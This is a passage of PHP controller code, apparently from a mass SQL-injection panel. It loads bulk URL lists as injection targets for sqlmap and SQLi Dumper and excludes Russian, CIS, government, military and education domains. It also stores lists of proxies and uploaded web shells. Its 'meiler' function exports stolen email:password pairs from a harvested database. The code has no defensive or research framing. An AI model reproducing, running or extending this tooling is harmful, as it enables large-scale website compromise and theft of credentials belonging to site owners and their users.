		$data = $this->Session->read('inject');
		unset($data['ordersTable']);
		$this->Session->write('inject', $data);
		$this->redirect(array('action' => 'krutaten_one/' . $id));
	}

	public function shlak_bds($id)
	{
		$this->Post->query('DELETE FROM `bds_one` WHERE `post_id`=' . $id);
		$data = $this->Session->read('inject');
		unset($data['bds']);
		$this->Session->write('inject', $data);
		$this->redirect(array('action' => 'krutaten_one/' . $id));
	}

	public function mysql_users_site_one($id)
	{
		$data2 = $this->Post->query('SELECT * FROM  `m_users` WHERE `post_id`=' . $id);
		$this->d($data2, 'users');
	}

	public function mysql_reconect($host, $user, $pass)
	{
		$link = mysql_connect($host, $user, $pass);

		if (!($link)) {
			$this->d(mysql_error(), $host . ',' . $user . ',' . $pass);
			return false;
		}


		return true;
	}

	public function add()
	{
		set_time_limit(0);

		if (isset($this->data)) {
			if (isset($this->data['Post']['link2']) && ($this->data['Post']['link2'] != '')) {
				$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/addlinks/';
				$name = rand(1, 1000);
				$file = $ff . $name . '.txt';
				$link2 = str_replace('http://', '', $this->data['Post']['link2']);
				$link2 = 'http://' . $link2;
				$files = file($link2);
				shuffle($files);

				if (1 < count($files)) {
					$fp = fopen($file, 'w');

					foreach ($files as $output ) {
						if (($output != '') || !(empty($output))) {
							fwrite($fp, $output);
						}

					}

					fclose($fp);
					$this->d('links s ' . $link2 . ' dabavlenni v ochered');
					flush();
				}


				$this->redirect(array('action' => 'add'));
			}


			if (isset($this->data['Post']['file_cron'])) {
				$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/addlinks/';
				$name = rand(1, 1000);

				if (copy($this->data['Post']['file_cron']['tmp_name'], $ff . $name . '.txt')) {
					echo 'Файл добавлен в очередь';
				}


				exit();
			}


			if ($this->data['Post']['file_sqlmap'] != '') {
				$this->dd('Обычное добавление sqlmap');
				$this->add_sqlmap($this->data['Post']);
				exit();
			}


			if ($this->data['Post']['sqli_dumper'] != '') {
				$this->dd('Обычное добавление');
				$this->add_dumper_links($this->data['Post']);
				exit();
			}


			if ($this->data['Post']['file_one'] != '') {
				$this->dd('Обычное добавление');
				$this->add_one_links($this->data['Post']);
				exit();
			}


			$files = file($this->data['Post']['add']['tmp_name']);
			shuffle($files);
			$this->dd(count($files), 'VSEGO linkov');
			$lll = array();
			$i = 0;
			$pusto = 0;
			$zapret = 0;
			$k = 0;
			$k2 = 0;
			$k3 = 0;

			foreach ($files as $value ) {
				if (500 < strlen($value)) {
					$fileopen3 = fopen('links/dlinie_bad.tx', 'a+');
					fwrite($fileopen3, $value . "\r\n");
					fclose($fileopen3);
					continue;
				}


				$value = str_replace('http://http://', 'http://', $value);
				$value = str_replace('https://https://', 'https://', $value);
				$value = str_replace('WWW.', 'www.', $value);
				$value = str_replace('wwwwww.', 'www.', $value);
				$value = str_replace('wwwwww', 'www', $value);

				if (stristr($value, 'https')) {
					$value = str_replace('https://', '', $value);
					$value = 'https://' . str_replace('%26', '&', $value);
				}
				 else {
					$value = str_replace('http://', '', $value);
					$value = 'http://' . str_replace('%26', '&', $value);
				}

				$value = trim($value);

				if (preg_match('/\.(ru|kz|az|am|by|ge|kg|kz|md|tj|tm|ua|uz|mil|gov|edu)+$/i', $value, $match)) {
					++$k3;
					$fileopen = fopen('links/zona_bad.tx', 'a+');
					fwrite($fileopen, $value . "\r\n");
					fclose($fileopen);
					continue;
				}


				$value2 = $value;
				$value2 = str_replace($this->engeen_addr, 'DICK!', $value2);
				if (strstr($value2, 'DICK!') || !(strstr($value2, '?'))) {
					++$zapret;
					$fileopen = fopen('links/zapret_bad.txt', 'a+');
					fwrite($fileopen, $value . "\r\n");
					fclose($fileopen);
					continue;
				}


				$data = parse_url($value);
				$host = $data['host'];
				$query = $data['query'];
				$path = $data['path'];
				$new[] = trim($value);
			}

			$this->dd($k3, 'zapreshenie zony /app/webroot/addlinks/zapret.txt');
			$this->dd(count($new), 'LINKOV PRIGODNYH DLYA VSTAVKI V BD ');
			$this->dd($zapret, 'V URL EST ZAPRESHENIE SLOVA ' . '\'tube\',\'google\',\'topic=\',\'modules.php\',\'act=Help\',\'module=forums\',\'module=help\',\'name=News\',\'forum\'  /app/webroot/addlinks/bad.txt');

			foreach ($new as $file ) {
				if (preg_match('/get::/i', $file)) {
					$file = str_replace('get::', '', $file);
					$header = 'get';
				}
				 else if (preg_match('/post::/i', $file)) {
					$file = str_replace('post::', '', $file);
					$header = 'post';
				}
				 else {
					$header = 'get';
				}

				$data = parse_url($file);
				$host = $data['host'];
				$query = $data['query'];
				$path = $data['path'];
				$domen = trim($data['host']);
				$domen = str_replace('www.', '', $domen);
				$domen = str_replace('wwwwww.', '', $domen);
				$domen = str_replace('wwwwww', '', $domen);
				flush();
				if (strstr($file, 'asp') || strstr($file, 'cfm')) {
					$type = 'asp';
				}
				 else {
					$type = '';
				}

				$id = 0;
				$date = date('Y-m-d h:i:s');
				$tic = 0;
				$maska = $this->get_arg_url($file);
				$url = $file;

				if (stristr($url, 'https')) {
					$http = 'https';
				}
				 else {
					$http = 'http';
				}

				$url = str_replace('https://', '', $url);
				$url = str_replace('http://', '', $url);
				$ff = $this->Injector->urlParseUrl3($url);
				$path_query = $domen . ':' . $path . ':' . $ff;
				$count = $this->Filed->query('select count(*) FROM `posts_all` WHERE `domen` like \'%' . $domen . '%\'');
				$ccc = $count[0][0]['count(*)'];

				if (($this->$domen < $this->link_count) && ($ccc < $this->link_count)) {
					if ($this->Post->query('INSERT INTO `posts_all` ' . "\r\n\t\t\t\t\t" . '(`url`,`date`,`maska`,`domen`,`tic`,`path_query`,`path`,`query`,`get_type`,`http`,`header`)' . "\r\n\t\t\t\t\t" . 'VALUES (\'' . $url . '\',\'' . $date . '\',\'' . $maska . '\',\'' . $domen . '\',\'' . $tic . '\',\'' . $path_query . '\',\'' . $path . '\',\'' . $query . '\',\'' . $type . '\',\'' . $http . '\',\'' . $header . '\')')) {
						$this->$domen = $this->$domen + 1;
						++$k;
					}
					 else {
						++$k2;
						$fileopen = fopen('links/dubli.txt', 'a+');
						fwrite($fileopen, $url . "\r\n");
						fclose($fileopen);
					}
				}


				flush();
			}

			$this->dd($k, 'DABAVLENO V BASU');
			$this->dd($k2, 'NE DABAVLENO V BASU (DUBLI)');
		}

	}

	public function add_one_links($fff)
	{
		$files = file($fff['file_one']['tmp_name']);
		shuffle($files);
		$this->dd(count($files), 'VSEGO linkov');
		$lll = array();
		$i = 0;
		$pusto = 0;
		$zapret = 0;
		$k = 0;
		$k2 = 0;
		$k3 = 0;

		foreach ($files as $value ) {
			if ($value == '') {
				++$pusto;
				continue;
			}


			if (500 < strlen($value)) {
				$fileopen3 = fopen('links/dlinie_bad.tx', 'a+');
				fwrite($fileopen3, $value . "\r\n");
				fclose($fileopen3);
				continue;
			}


			if ($value == '') {
				++$pusto;
				continue;
			}


			$value = str_replace('*', '', $value);
			$value = str_replace('[t]', '', $value);
			$value = str_replace('http://http://', 'http://', $value);
			$value = str_replace('https://https://', 'https://', $value);
			$value = str_replace('WWW.', 'www.', $value);
			$value = str_replace('wwwwww.', 'www.', $value);
			$value = str_replace('wwwwww', 'www', $value);

			if (stristr($value, 'https')) {
				$value = str_replace('https://', '', $value);
				$value = 'https://' . str_replace('%26', '&', $value);
			}
			 else {
				$value = str_replace('http://', '', $value);
				$value = 'http://' . str_replace('%26', '&', $value);
			}

			$value = trim($value);

			if (preg_match('/\.(ru|kz|az|am|by|ge|kg|kz|md|tj|tm|ua|uz|mil|gov|edu)+$/i', $value, $match)) {
				++$k3;
				$fileopen = fopen('links/zona_bad.tx', 'a+');
				fwrite($fileopen, $value . "\r\n");
				fclose($fileopen);
				continue;
			}


			$value2 = $value;
			$value2 = str_replace($this->engeen_addr, 'DICK!', $value2);
			if (strstr($value2, 'DICK!') || !(strstr($value2, '?'))) {
				++$zapret;
				$fileopen = fopen('links/zapret_bad.txt', 'a+');
				fwrite($fileopen, $value . "\r\n");
				fclose($fileopen);
				continue;
			}


			$data = parse_url($value);
			$host = $data['host'];
			$query = $data['query'];
			$path = $data['path'];
			$new[] = $value;
		}

		$this->dd($k3, 'zapreshenie zony /app/webroot/addlinks/zapret.txt');
		$this->dd(count($new), 'LINKOV PRIGODNYH DLYA VSTAVKI V BD');
		$this->dd($zapret, 'V URL EST ZAPRESHENIE SLOVA ' . '\'tube\',\'google\',\'topic=\',\'modules.php\',\'act=Help\',\'module=forums\',\'module=help\',\'name=News\',\'forum\' /app/webroot/addlinks/bad.txt');

		foreach ($new as $file ) {
			if (preg_match('/get::/i', $file)) {
				$file = str_replace('get::', '', $file);
				$header = 'get';
			}
			 else if (preg_match('/post::/i', $file)) {
				$file = str_replace('post::', '', $file);
				$header = 'post';
			}
			 else {
				$header = 'get';
			}

			$data = parse_url($file);
			$host = $data['host'];
			$query = $data['query'];
			$path = $data['path'];
			$path = str_replace('*', '[t]', $path);
			$domen = trim($data['host']);
			$domen = str_replace('*', '', $domen);
			$domen = str_replace('www.', '', $domen);
			$domen = str_replace('wwwwww.', '', $domen);
			$domen = str_replace('wwwwww', '', $domen);
			flush();
			if (strstr($file, 'asp') || strstr($file, 'cfm')) {
				$type = 'asp';
			}
			 else {
				$type = '';
			}

			$id = 0;
			$date = date('Y-m-d h:i:s');
			$tic = 0;
			$maska = $this->get_arg_url($file);
			$url = $file;

			if (stristr($url, 'https')) {
				$http = 'https';
			}
			 else {
				$http = 'http';
			}

			$url = str_replace('https://', '', $url);
			$url = str_replace('http://', '', $url);
			$ff = $this->Injector->urlParseUrl3($url);
			$ff = str_replace('*', '[t]', $ff);
			$path_query = $domen . ':' . $path . ':' . $ff;

			if ($this->Post->query('INSERT INTO `posts` ' . "\r\n\t\t\t\t\t" . '(`url`,`date`,`maska`,`domen`,`tic`,`get_type`,`http`,`header`)' . "\r\n\t\t\t\t\t" . 'VALUES (\'' . $url . '\',\'' . $date . '\',\'' . $maska . '\',\'' . $domen . '\',\'' . $tic . '\',\'' . $type . '\',\'' . $http . '\',\'' . $header . '\')')) {
				$this->$domen = $this->$domen + 1;
				++$k;
			}
			 else {
				++$k2;
				$fileopen = fopen('links/dubli.txt', 'a+');
				fwrite($fileopen, $url . "\r\n");
				fclose($fileopen);
			}

			flush();
		}

		$this->dd($k, 'DABAVLENO V BASU');
		$this->dd($k2, 'NE DABAVLENO V BASU (DUBLI)');
	}

	public function add_sqlmap($fff)
	{
		$files = file($fff['file_sqlmap']['tmp_name']);
		shuffle($files);
		$this->dd(count($files), 'VSEGO linkov');
		$lll = array();
		$i = 0;
		$pusto = 0;
		$zapret = 0;
		$k = 0;
		$k2 = 0;
		$k3 = 0;

		foreach ($files as $value ) {
			if ($value == '') {
				++$pusto;
				continue;
			}


			if ($value == '') {
				++$pusto;
				continue;
			}


			$value = str_replace('*', '', $value);
			$value = str_replace('[t]', '', $value);
			$value = str_replace('http://http://', 'http://', $value);
			$value = str_replace('https://https://', 'https://', $value);
			$value = str_replace('WWW.', 'www.', $value);
			$value = str_replace('wwwwww.', 'www.', $value);
			$value = str_replace('wwwwww', 'www', $value);

			if (stristr($value, 'https')) {
				$value = str_replace('https://', '', $value);
				$value = 'https://' . str_replace('%26', '&', $value);
			}
			 else {
				$value = str_replace('http://', '', $value);
				$value = 'http://' . str_replace('%26', '&', $value);
			}

			$value = trim($value);

			if (preg_match('/\.(ru|kz|az|am|by|ge|kg|kz|md|tj|tm|ua|uz|mil|gov|edu)+$/i', $value, $match)) {
				++$k3;
				$fileopen = fopen('links/zona_bad.tx', 'a+');
				fwrite($fileopen, $value . "\r\n");
				fclose($fileopen);
				continue;
			}


			$value2 = $value;
			$value2 = str_replace($this->Injector->engeen_addr, 'DICK!', $value2);
			if (strstr($value2, 'DICK!') || !(strstr($value2, '?'))) {
				++$zapret;
				$fileopen = fopen('links/zapret_bad.txt', 'a+');
				fwrite($fileopen, $value . "\r\n");
				fclose($fileopen);
				continue;
			}


			$data = parse_url($value);
			$host = $data['host'];
			$query = $data['query'];
			$path = $data['path'];
			$new[] = $value;
		}

		$this->dd($k3, 'zapreshenie zony /app/webroot/addlinks/zapret.txt');
		$this->dd(count($new), 'LINKOV PRIGODNYH DLYA VSTAVKI V BD');
		$this->dd($zapret, 'V URL EST ZAPRESHENIE SLOVA ' . '\'tube\',\'google\',\'topic=\',\'modules.php\',\'act=Help\',\'module=forums\',\'module=help\',\'name=News\',\'forum\' /app/webroot/addlinks/bad.txt');

		foreach ($new as $file ) {
			if (preg_match('/get::/i', $file)) {
				$file = str_replace('get::', '', $file);
				$header = 'get';
			}
			 else if (preg_match('/post::/i', $file)) {
				$file = str_replace('post::', '', $file);
				$header = 'post';
			}
			 else {
				$header = 'get';
			}

			$data = parse_url($file);
			$host = $data['host'];
			$query = $data['query'];
			$path = $data['path'];
			$path = str_replace('*', '[t]', $path);
			$domen = trim($data['host']);
			$domen = str_replace('*', '', $domen);
			$domen = str_replace('www.', '', $domen);
			$domen = str_replace('wwwwww.', '', $domen);
			$domen = str_replace('wwwwww', '', $domen);
			flush();
			if (strstr($file, 'asp') || strstr($file, 'cfm')) {
				$type = 'asp';
			}
			 else {
				$type = '';
			}

			$id = 0;
			$date = date('Y-m-d h:i:s');
			$tic = 0;
			$maska = $this->get_arg_url($file);
			$url = $file;

			if (stristr($url, 'https')) {
				$http = 'https';
			}
			 else {
				$http = 'http';
			}

			$url = str_replace('https://', '', $url);
			$url = str_replace('http://', '', $url);
			$ff = $this->Injector->urlParseUrl3($url);
			$ff = str_replace('*', '[t]', $ff);
			$path_query = $domen . ':' . $path . ':' . $ff;

			if ($this->Post->query('INSERT INTO `posts` ' . "\r\n\t\t\t\t\t" . '(`url`,`date`,`maska`,`domen`,`tic`,`get_type`,`http`,`header`,`sqlmap_check`)' . "\r\n\t\t\t\t\t" . 'VALUES (\'' . $url . '\',\'' . $date . '\',\'' . $maska . '\',\'' . $domen . '\',\'' . $tic . '\',\'' . $type . '\',\'' . $http . '\',\'' . $header . '\',1)')) {
				$this->$domen = $this->$domen + 1;
				++$k;
			}
			 else {
				++$k2;
				$fileopen = fopen('links/dubli.txt', 'a+');
				fwrite($fileopen, $url . "\r\n");
				fclose($fileopen);
			}

			flush();
		}

		$this->dd($k, 'DABAVLENO V BASU');
		$this->dd($k2, 'NE DABAVLENO V BASU (DUBLI)');
	}

	public function add_all_to_posts()
	{
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/links/');

		if ($this->head_check == true) {
			$posts = $this->Post->query('SELECT * FROM `posts` WHERE `status`=11');
		}
		 else {
			$posts = $this->Post->query('SELECT * FROM `posts` WHERE `status`=1');
		}

		foreach ($posts as $one ) {
			if ($this->Post->query('DELETE FROM `posts` WHERE `id`=' . $one['posts']['id'])) {
				$this->d('delte ' . $one['posts']['url']);
				$fileopen = fopen($this->links_bad, 'a+');
				fwrite($fileopen, $one['posts']['url'] . "\r\n");
				fclose($fileopen);
			}

		}

		$file = $this->Post->query('SELECT count(*) as count FROM `posts_all` WHERE `check_posts`=0');

		if (intval($file[0][0]['count']) !== 0) {
			$this->timeStart = $this->start('add_all_to_posts', 1);
		}
		 else {
			exit('TimeStart');
		}

		$file100 = $this->Post->query('SELECT * FROM `posts_all` WHERE `check_posts`=0 GROUP BY `domen` ');

		foreach ($file100 as $val100 ) {
			$id = $val100['posts_all']['id'];
			$url = $val100['posts_all']['url'];
			$domen = $val100['posts_all']['domen'];
			$type = $val100['posts_all']['type'];
			$maska = $val100['posts_all']['maska'];
			$type = $val100['posts_all']['get_type'];
			$date = $val100['posts_all']['date'];
			$http = $val100['posts_all']['http'];
			$check_d = $this->Post->query('SELECT * FROM `posts` WHERE `domen` like \'%' . $domen . '%\' limit 1');
			$post_id = $check_d['posts']['id'];
			$post_url = $check_d['posts']['url'];

			if (count($check_d) < 1) {
				if ($this->Post->query('INSERT INTO `posts` ' . "\r\n\t\t\t" . '(`url`,' . "\r\n\t\t\t" . '`date`,' . "\r\n\t\t\t" . '`maska`,' . "\r\n\t\t\t" . '`domen`,' . "\r\n\t\t\t" . '`tic`,' . "\r\n\t\t\t" . '`get_type`,' . "\r\n\t\t\t" . '`http`)' . "\r\n\t\t\t" . 'VALUES (\'' . $url . '\',\'' . $date . '\',\'' . $maska . '\',\'' . $domen . '\',\'0\',\'' . $type . '\',\'' . $http . '\')')) {
					if ($this->Post->query('UPDATE  `posts_all` SET  `check_posts` =  1 WHERE  `id` =' . $id . ' ')) {
						echo $url . ' - OK<br>';
					}

				}
				 else {
					echo $url . '  --  ' . $domen . ' NO !!!!!!<br>';
				}
			}

		}

		$this->stop();
	}

	public function add_one()
	{
		if (isset($this->data)) {
			if ($this->data['Post']['link'] != '') {
				$value = $this->data['Post']['link'];
				$value = trim($value);
			}
			 else {
				$this->d('dabavte link');
				exit();
			}

			$value_orig = $value;
			$value_orig = str_replace('post::', '', $value_orig);
			if (stristr($value, 'https') || stristr($value, 'http')) {
				$data = parse_url($value_orig);
			}
			 else {
				$data = parse_url('http://' . $value_orig);
			}

			$domen = $data['host'];

			if ($data['query'] == '') {
				$this->d($value_orig . ' - query pusto');
				exit();
			}


			if (!(isset($data['host']))) {
				$this->d($value_orig . ' - host pusto');
				exit();
			}


			$data = $this->oneinfo($value, $domen);
		}


		$data2 = $this->Post->query('SELECT * FROM  `posts_one` WHERE `status` =3');
		$this->Post->query('UPDATE  `posts_one`  set `http` =  REPLACE(http,\'http://\',\'http\')');
		$this->Post->query('UPDATE  `posts_one`  set `http` =  REPLACE(http,\'https://\',\'https\')');
		$this->Post->query('UPDATE  `posts_one`  set `header` =  REPLACE(header,\'http\',\'get\')');
		$p = array();
		$i = 1;

		foreach ($data2 as $d ) {
			$p[$i]['id'][] = $d['posts_one']['id'];
			$p[$i]['gurl'][] = $d['posts_one']['gurl'];
			$p[$i]['url'][] = $d['posts_one']['url'];
			$p[$i]['file_priv'][] = $d['posts_one']['file_priv'];
			$p[$i]['tic'][] = $d['posts_one']['tic'];
			$p[$i]['sposob'][] = $d['posts_one']['sposob'];
			$p[$i]['method'][] = $d['posts_one']['method'];
			$p[$i]['column'][] = $d['posts_one']['column'];
			$p[$i]['version'][] = $d['posts_one']['version'];
			$p[$i]['work'][] = $d['posts_one']['work'];
			$p[$i]['status'][] = $d['posts_one']['status'];
			$p[$i]['domen'][] = $d['posts_one']['domen'];
			$p[$i]['order'][] = $d['posts_one']['order'];
			$p[$i]['sleep'][] = $d['posts_one']['sleep'];
			$p[$i]['user'][] = $d['posts_one']['user'];
			$p[$i]['find'][] = $d['posts_one']['find'];
			$p[$i]['http'][] = $d['posts_one']['http'];
			$p[$i]['header'][] = $d['posts_one']['header'];
			++$i;
		}

		$this->set('data', $p);
	}

	public function add_one_domen()
	{
		if (isset($this->data)) {
			if ($this->data['Post']['domen'] != '') {
				$value = $this->data['Post']['domen'];
				$value = trim($value);
			}
			 else {
				$this->d('dabavte link');
				exit();
			}

			$data = $this->crowler($value);
		}


		exit();
		$data2 = $this->Post->query('SELECT * FROM  `posts_one` WHERE `status` =3');
		$this->Post->query('UPDATE  `posts_one`  set `http` =  REPLACE(http,\'http://\',\'http\')');
		$this->Post->query('UPDATE  `posts_one`  set `http` =  REPLACE(http,\'https://\',\'https\')');
		$this->Post->query('UPDATE  `posts_one`  set `header` =  REPLACE(header,\'http\',\'get\')');
		$p = array();
		$i = 1;

		foreach ($data2 as $d ) {
			$p[$i]['id'][] = $d['posts_one']['id'];
			$p[$i]['gurl'][] = $d['posts_one']['gurl'];
			$p[$i]['url'][] = $d['posts_one']['url'];
			$p[$i]['file_priv'][] = $d['posts_one']['file_priv'];
			$p[$i]['tic'][] = $d['posts_one']['tic'];
			$p[$i]['sposob'][] = $d['posts_one']['sposob'];
			$p[$i]['method'][] = $d['posts_one']['method'];
			$p[$i]['column'][] = $d['posts_one']['column'];
			$p[$i]['version'][] = $d['posts_one']['version'];
			$p[$i]['work'][] = $d['posts_one']['work'];
			$p[$i]['status'][] = $d['posts_one']['status'];
			$p[$i]['domen'][] = $d['posts_one']['domen'];
			$p[$i]['order'][] = $d['posts_one']['order'];
			$p[$i]['sleep'][] = $d['posts_one']['sleep'];
			$p[$i]['user'][] = $d['posts_one']['user'];
			$p[$i]['find'][] = $d['posts_one']['find'];
			$p[$i]['http'][] = $d['posts_one']['http'];
			$p[$i]['header'][] = $d['posts_one']['header'];
			++$i;
		}

		$this->set('data', $p);
	}

	public function add_domens()
	{
		set_time_limit(0);

		if (isset($this->data)) {
			if ($this->data['Post']['link'] != '') {
				$link = str_replace('http://', '', $this->data['Post']['link']);
				$link = 'http://' . $link;
				$files = file($link);
			}
			 else {
				$files = file($this->data['Post']['file']['tmp_name']);
			}

			$this->d(count($files), 'VSEGO доменов');
			$files = array_unique($files);
			shuffle($files);

			foreach ($files as $value ) {
				$value = str_replace('http://http://', 'http://', $value);
				$value = str_replace('https://http://', 'http://', $value);
				$value = str_replace('https://', '', $value);
				$value = str_replace('http://', '', $value);
				$value = str_replace('/', '', $value);
				$value = str_replace('WWW.', 'www.', $value);
				$value = str_replace('www.', '', $value);
				$value = strtolower($value);
				$value = trim($value);
				$ext = explode('.', $value);

				if (@$ext[1] == '') {
					++$k2;
					continue;
				}


				flush();
				$date = date('Y-m-d h:i:s');

				if ($this->Post->query('INSERT INTO `domens` (`date`,`domen`) VALUES (\'' . $date . '\',\'' . $value . '\')')) {
					++$k;
				}
				 else {
					++$k2;
				}
			}

			$this->d($k, 'DABAVLENO V BASU');
			$this->d($k2, 'NE DABAVLENO V BASU (DUBLI)');
			$this->d($k3, 'Zaprechenie zony');
		}

	}

	public function add_cron()
	{
		$this->timeStart = $this->start('add_cron_links', 1);
		set_time_limit(0);
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/addlinks', 511);
		$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/addlinks/';
		$dir = opendir($ff);
		$i = 0;
		$lll = 0;
        $files_all = array();

		while (false !== $file = readdir($dir)) {
			if (($file != '.') && ($file != '..') && ($file != 'Thumbs.db')) {
				$files_all[$ff . $file] = file($ff . $file);
				++$i;
				$this->d($ff . $file, $i);
			}

		}

		foreach ($files_all as $key => $files ) {
			shuffle($files);
			$this->d(count($files), 'VSEGO linkov ' . $key);
			$i = 0;
			$pusto = 0;

			foreach ($files as $value ) {
				if ($value == '') {
					++$pusto;
					continue;
				}


                $value = $this->replace_url_schema($value);
                $value2 = trim($value);
				$data = parse_url($value);

				if ($data['query'] != '') {
					$path = $data['path'] . '?';
				}
				 else {
					$path = '';
				}

				$value = str_replace($this->Injector->engeen_addr, 'DICK!', $path . $data['query']);

				if (!(strstr($value, 'DICK!')) && strstr($value, '?')) {
					if ($data['query'] == '') {
						++$pusto;
						continue;
					}


					if (!(isset($data['host']))) {
						++$pusto;
						continue;
					}


					$new['http://' . $data['host'] . '' . $data['path'] . ''] = trim($value2);
				}
				 else {
					++$pusto;
				}
			}

			$this->d($pusto, 'V URL EST ZAPRESHENIE SLOVA ILI NETU ? ILI NETU .PHP ' . $key);
			$this->d(count($new), 'LINKOV PRIGODNYH DLYA VSTAVKI V BD ' . $key);
			$lll = array();
			$k = 0;
			$k2 = 0;

			foreach ($new as $file ) {
				$url = parse_url($file);
				flush();
				$domen = $url['host'];
				$file = str_replace('https://', '', $file);
				$file = str_replace('http://', '', $file);
				$this->data['Post']['id'] = 0;
				$this->data['Post']['url'] = $file;
				$this->data['Post']['date'] = date('Y-m-d h:i:s');
				$this->data['Post']['tic'] = 0;
				$this->data['Post']['maska'] = $this->get_arg_url($file);
				$this->data['Post']['domen'] = $domen;

				if ($this->Post->save($this->data)) {
					++$k;
				}
				 else {
					++$k2;
				}
			}

			unlink($key);
			$this->d($k, 'DABAVLENO V BASU  ' . $key);
			$this->d($k2, 'NE DABAVLENO V BASU (DUBLI)  ' . $key);
			$this->d('-----------------------------');
		}

		$this->stop();
	}

	public function add_cron_N()
	{
		$this->timeStart = $this->start('add_cron_links_N', 1);
		set_time_limit(0);
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/addlinks', 511);
		$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/addlinks/';
		$dir = opendir($ff);
		$i = 0;
		$lll = 0;

		while (false !== $file = readdir($dir)) {
			if (($file != '.') && ($file != '..') && ($file != 'Thumbs.db')) {
				$files_all[$ff . $file] = file($ff . $file);
				++$i;
				$this->d($ff . $file, $i);
			}

		}

		foreach ($files_all as $key => $files ) {
			shuffle($files);
			$this->d(count($files), 'VSEGO linkov ' . $key);
			$i = 0;
			$pusto = 0;

			foreach ($files as $value ) {
				if ($value == '') {
					++$pusto;
					continue;
				}


                $value = $this->replace_url_schema($value);
                $value2 = trim($value);
				$data = parse_url($value);

				if ($data['query'] != '') {
					$path = $data['path'] . '?';
				}
				 else {
					$path = '';
				}

				$value = str_replace($this->Injector->engeen_addr, 'DICK!', $path . $data['query']);

				if (!(strstr($value, 'DICK!')) && strstr($value, '?')) {
					if ($data['query'] == '') {
						++$pusto;
						continue;
					}


					if (!(isset($data['host']))) {
						++$pusto;
						continue;
					}


					$new['http://' . $data['host'] . '' . $data['path'] . ''] = trim($value2);
				}
				 else {
					++$pusto;
				}
			}

			$this->d($pusto, 'V URL EST ZAPRESHENIE SLOVA ILI NETU ? ILI NETU .PHP ' . $key);
			$this->d(count($new), 'LINKOV PRIGODNYH DLYA VSTAVKI V BD ' . $key);
			$lll = array();
			$k = 0;
			$k2 = 0;

			foreach ($new as $file ) {
				$url = parse_url($file);
				flush();
				$domen = $url['host'];
				$file = str_replace('https://', '', $file);
				$file = str_replace('http://', '', $file);
				$this->data['Post']['id'] = 0;
				$this->data['Post']['url'] = $file;
				$this->data['Post']['date'] = date('Y-m-d h:i:s');
				$this->data['Post']['tic'] = 0;
				$this->data['Post']['maska'] = $this->get_arg_url($file);
				$this->data['Post']['domen'] = $domen;

				if ($this->Post->save($this->data)) {
					++$k;
				}
				 else {
					++$k2;
				}
			}

			unlink($key);
			$this->d($k, 'DABAVLENO V BASU  ' . $key);
			$this->d($k2, 'NE DABAVLENO V BASU (DUBLI)  ' . $key);
			$this->d('-----------------------------');
		}

		$this->stop();
	}

	public function add_proxy()
	{
		if (isset($this->data)) {
			$files = file($this->data['Post']['file']['tmp_name']);
			shuffle($files);

			if (file_put_contets('proxy.txt', $files)) {
				echo 'good socks:' . count($files);
			}


			$this->redirect(array('action' => 'index'));
		}

	}

	public function add_shells()
	{
		if (isset($this->data)) {
			$files = file($this->data['Post']['file']['tmp_name']);
			shuffle($files);

			if (file_put_contents('shelllist.txt', $files)) {
				echo 'good shells uploads:' . count($files);
			}


			$this->redirect(array('action' => 'add_shells'));
		}

	}

	public function meiler()
	{
		if (($this->params['form']['down'] != '') || ($this->params['form']['down2'] != '') || ($this->params['form']['onedomen'] != '')) {
			$sdate = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			$domen = trim($this->params['form']['domen']);
			$zona = trim($this->params['form']['zona']);
			$type = $this->params['form']['type'];
			$site = $this->params['form']['site'];
			$z0 = '';

			if ($domen != '') {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\' AND pass !=\'0\' AND hashtype =\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\' AND pass !=\'0\' AND hashtype =\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\'  AND pass !=\'0\' AND hashtype !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\' AND pass !=\'0\' AND hashtype !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\'  AND pass !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\' AND pass !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];

						if ($d['mails']['pass'] != 0) {
							$z0 .= ':';
							$z0 .= $d['mails']['pass'];
						}


						$z0 .= "\r\n";
					}
				}


				$count = $c0[0][0]['count(*)'];
				$all = $domen . ' count: ' . $count;
				$str = $z0;
			}


			if ($zona == '*') {
				if ($type == 'countNoHash') {
